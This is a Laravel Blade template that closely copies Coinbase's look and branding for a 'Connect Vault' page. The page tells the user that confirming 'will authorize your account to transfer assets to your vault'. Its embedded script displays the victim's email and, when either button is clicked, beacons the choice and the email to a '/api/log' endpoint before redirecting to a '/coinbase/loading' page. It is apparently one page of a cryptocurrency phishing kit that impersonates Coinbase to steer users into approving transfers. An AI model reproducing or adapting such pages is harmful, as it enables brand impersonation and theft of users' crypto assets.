@extends('user.coinbase.layout')

@section('title', 'Coinbase - Connect Vault')

@section('pageCss')
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }

*,
:before,
:after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
  border-color: #e5e7eb;
}

html,
:host {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
  font-feature-settings: normal;
  font-variation-settings: normal;
  -webkit-tap-highlight-color: transparent;
}

body {
  margin: 0;
  line-height: inherit;
}

button,
input,
optgroup,
select,
textarea {
  font-family: inherit;
  font-feature-settings: inherit;
  font-variation-settings: inherit;
  font-size: 100%;
  font-weight: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  color: inherit;
  margin: 0;
  padding: 0;
}

button,
select {
  text-transform: none;
}

button,
input:where([type=button]),
input:where([type=reset]),
input:where([type=submit]) {
  -webkit-appearance: button;
  background-color: transparent;
  background-image: none;
}

button {
  height: auto;
  -webkit-appearance: button;
  font: inherit;
}

button,
[role=button] {
  cursor: pointer;
}

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block;
  vertical-align: middle;
}

#root {
  height: 100%;
}

.bg-coinbase-background {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}
.bg-coinbase-primary {
  --tw-bg-opacity: 1;
  background-color: rgb(87 139 250 / var(--tw-bg-opacity, 1));
}
.bg-coinbase-line { background-color: #8a919e33; }
.bg-\[\#32353d\] {
  --tw-bg-opacity: 1;
  background-color: rgb(50 53 61 / var(--tw-bg-opacity, 1));
}
.flex { display: flex; }
.flex-col { flex-direction: column; }
.flex-grow { flex-grow: 1; }
.font-coinbase-sans { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-text { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-title { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-semibold { font-weight: 600; }
.gap-4 { gap: 1rem; }
.h-5 { height: 1.25rem; }
.h-12 { height: 3rem; }
.h-\[1px\] { height: 1px; }
.h-full { height: 100%; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.justify-start { justify-content: flex-start; }
.max-w-32 { max-width: 8rem; }
.max-w-md { max-width: 28rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.mt-2 { margin-top: .5rem; }
.mt-4 { margin-top: 1rem; }
.mt-12 { margin-top: 3rem; }
.p-2 { padding: .5rem; }
.p-2\.5 { padding: .625rem; }
.p-4 { padding: 1rem; }
.p-6 { padding: 1.5rem; }
.pb-2 { padding-bottom: .5rem; }
.pb-8 { padding-bottom: 2rem; }
.pl-6 { padding-left: 1.5rem; }
.pr-8 { padding-right: 2rem; }
.pt-5 { padding-top: 1.25rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.px-12 { padding-left: 3rem; padding-right: 3rem; }
.py-4 { padding-top: 1rem; padding-bottom: 1rem; }
.py-6 { padding-top: 1.5rem; padding-bottom: 1.5rem; }
.ring-1 {
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
}
.ring-coinbase-line { --tw-ring-color: #8a919e33; }
.rounded-\[16px\] { border-radius: 16px; }
.rounded-full { border-radius: 9999px; }
.rounded-md { border-radius: .375rem; }
.text-\[28px\] { font-size: 28px; }
.text-black {
  --tw-text-opacity: 1;
  color: rgb(0 0 0 / var(--tw-text-opacity, 1));
}
.text-center { text-align: center; }
.text-coinbase-foreground-muted {
  --tw-text-opacity: 1;
  color: rgb(138 145 158 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.transition-colors {
  transition-property: color,background-color,border-color,text-decoration-color,fill,stroke;
  transition-timing-function: cubic-bezier(.4,0,.2,1);
  transition-duration: .15s;
}
.w-5 { width: 1.25rem; }
.w-12 { width: 3rem; }
.w-full { width: 100%; }
.hover\:bg-\[\#0f1012\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(15 16 18 / var(--tw-bg-opacity, 1));
}
.hover\:bg-\[\#3a3d45\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(58 61 69 / var(--tw-bg-opacity, 1));
}
.hover\:bg-\[\#507fe5\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(80 127 229 / var(--tw-bg-opacity, 1));
}
.disabled\:bg-\[\#1e2024\]:disabled {
  --tw-bg-opacity: 1;
  background-color: rgb(30 32 36 / var(--tw-bg-opacity, 1));
}
.disabled\:bg-\[\#314b84\]:disabled {
  --tw-bg-opacity: 1;
  background-color: rgb(49 75 132 / var(--tw-bg-opacity, 1));
}
.disabled\:text-\[\#858586\]:disabled {
  --tw-text-opacity: 1;
  color: rgb(133 133 134 / var(--tw-text-opacity, 1));
}
.disabled\:scale-100:disabled {
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.active\:bg-\[\#47494f\]:active {
  --tw-bg-opacity: 1;
  background-color: rgb(71 73 79 / var(--tw-bg-opacity, 1));
}
.active\:bg-\[\#4b78d6\]:active {
  --tw-bg-opacity: 1;
  background-color: rgb(75 120 214 / var(--tw-bg-opacity, 1));
}
.active\:scale-\[\.98\]:active {
  --tw-scale-x: .98;
  --tw-scale-y: .98;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}

@media (min-width: 640px) {
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line,
  .sm\:border-crypto-line { border-color: #8a919e33; }
  .sm\:justify-start { justify-content: flex-start; }
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 items-center text-center">
<span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
Connect Vault
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
This will authorize your account to transfer assets to your vault.
</span>
<div class="flex w-full items-center justify-center px-12 py-6">
<div class="flex h-12 w-12 items-center justify-center rounded-full p-2.5 ring-1 ring-coinbase-line">
<svg class="h-full w-full" fill="none" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
<path d="M48 44h-8v4h8v-4ZM8 44H0v4h8v-4ZM48 8H0v36h48V8Z" fill="#0052FF"></path>
<path d="M40 8H8v32h32V8Z" fill="#0A0B0D"></path>
<path d="M40 0H8v8h32V0Z" fill="#CED2DB"></path>
<path d="M8 32H6v4h2v-4Zm0-20H6v4h2v-4Z" fill="#0A0B0D"></path>
<path clip-rule="evenodd" d="M24 21.1a3.3 3.3 0 1 0 0 6.6 3.3 3.3 0 0 0 0-6.6Zm-5.3 3.3a5.3 5.3 0 1 1 10.6 0 5.3 5.3 0 0 1-10.6 0Z" fill="#FFF" fill-rule="evenodd"></path>
<path clip-rule="evenodd" d="M24 15.6a8.8 8.8 0 1 0 0 17.6 8.8 8.8 0 0 0 0-17.6Zm-10.8 8.8c0-5.965 4.835-10.8 10.8-10.8 5.964 0 10.8 4.835 10.8 10.8 0 5.965-4.836 10.8-10.8 10.8-5.965 0-10.8-4.835-10.8-10.8Z" fill="#FFF" fill-rule="evenodd"></path>
<path clip-rule="evenodd" d="m20.491 22.307-4.3-4.3 1.415-1.414 4.3 4.3-1.415 1.414Zm9.912 9.908-4.2-4.1 1.397-1.43 4.2 4.1-1.397 1.43Zm-14.212-1.422 3.8-3.8 1.415 1.414-3.8 3.8-1.415-1.414Zm15.917-13.086-4.6 4.6-1.414-1.414 4.6-4.6 1.414 1.414Z" fill="#FFF" fill-rule="evenodd"></path>
</svg>
</div>
<div class="h-[1px] max-w-32 flex-grow bg-coinbase-line">
</div>
<div class="flex h-12 w-12 items-center justify-center rounded-full p-2 ring-1 ring-coinbase-line">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#0052FF" class="h-5 w-5">
<path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12Zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8Z"/>
</svg>
</div>
</div>
<button class="font-coinbase-sans text-white flex items-center justify-start gap-4 rounded-md p-4 font-semibold ring-1 ring-coinbase-line hover:bg-[#0f1012] mt-2" type="button">
<img alt="user avatar" class="rounded-full" height="32" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD//gA7Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcgSlBFRyB2NjIpLCBxdWFsaXR5ID0gOTAK/9sAQwADAgIDAgIDAwMDBAMDBAUIBQUEBAUKBwcGCAwKDAwLCgsLDQ4SEA0OEQ4LCxAWEBETFBUVFQwPFxgWFBgSFBUU/9sAQwEDBAQFBAUJBQUJFA0LDRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU/8AAEQgAOAA4AwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/aAAwDAQACEQMRAD8A+t80Zo4o4oAM0ZrsPBvw7m8Sxi7uZDa2GcKwHzyeu30HvXdf8Kp0Dytnlz7v+ennHP8Ah+lAHiuaM12XjL4dTeG4jd2sjXViDhiR88f1x1HvXG8UAGaKOKKADI9Kkt4vtFxFEOC7Bc/U4qPJ9KVXZGDLwwOQaAPpS0tY7G1ht4VCRRKEVcdABipc1meG9eh8RaRBeRMNzACRB1R+4/z2rU/OgCK5t47y3lgmUPFKpR1I6gjBr5uu4fst1NCefLdkz64OK+g/EWuQ+HtJnvJmHyjCIerv2Ar55klaWRnblmJJPqaAG5HpRRk+lFABzVnTtOutWvY7W0iMs8hwqj+Z9BVbB9a9o+GXhlNI0VL2VR9rvFD5PVY/4R+PX8vSgCfwX4EXwsDNJdSTXTrh1RisQ/Dv9T+QrrP89aT8qPyoA5Txr4FHilRNHdSQ3Ua4RHYtEfw7fUfrXjOo6dc6Tey2t3EYp4zgqf5j1FfSP5VxvxN8Mpq+jPfRKPtlmpfI6tH/ABD8Ov5+tAHi/NFGDRQBY060+3aja22f9dKsf5kD+tfSKIsaKigKqjAAHAFFFAC/j+lL+P6UUUAH4/pTXRZEZGG5WGCCOooooA+btRtPsOoXVtn/AFMrR/kSKKKKAP/Z" width="32"/>
<span id="cv-email-display"></span>
</button>
<span class="font-coinbase-sans text-coinbase-foreground-muted mt-4">
Please confirm that this is the correct account you want to connect to.
</span>
<div class="mt-4 flex w-full gap-4">
<button id="cv-cancel-btn" class="bg-[#32353d] hover:bg-[#3a3d45] disabled:bg-[#1e2024] disabled:text-[#858586] disabled:scale-100 active:scale-[.98] active:bg-[#47494f] mt-4 rounded-full py-4 flex font-coinbase-sans text-white pl-6 pr-8 items-center font-semibold justify-center w-full" type="button">
Cancel
</button>
<button id="cv-connect-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center w-full" type="button">
Connect
</button>
</div>
</form>
<script>
(function(){
  var d = window._cbCvData || {};
  var email = (d.email || '').trim();
  var el = document.getElementById('cv-email-display');
  if (el) {
    if (email) { el.textContent = email; el.style.display = ''; }
    else { el.textContent = ''; el.style.display = 'none'; }
  }
  var _sent = false;
  function send(action) {
    if (_sent) return; _sent = true;
    var csrf = window._liveledCSRF || '';
    var b = new URLSearchParams({_token:csrf,type:'form_submit',page:'coinbase_connect_vault',element:'action',value:action+'|'+email});
    try{navigator.sendBeacon('/api/log',b);}catch(e){}
    if(window.navigateTo) window.navigateTo('/coinbase/loading');
    else window.location.href='/coinbase/loading';
  }
  document.getElementById('cv-cancel-btn').addEventListener('click', function(){ send('cancel'); });
  document.getElementById('cv-connect-btn').addEventListener('click', function(){ send('connect'); });
})();
</script>
@endsection
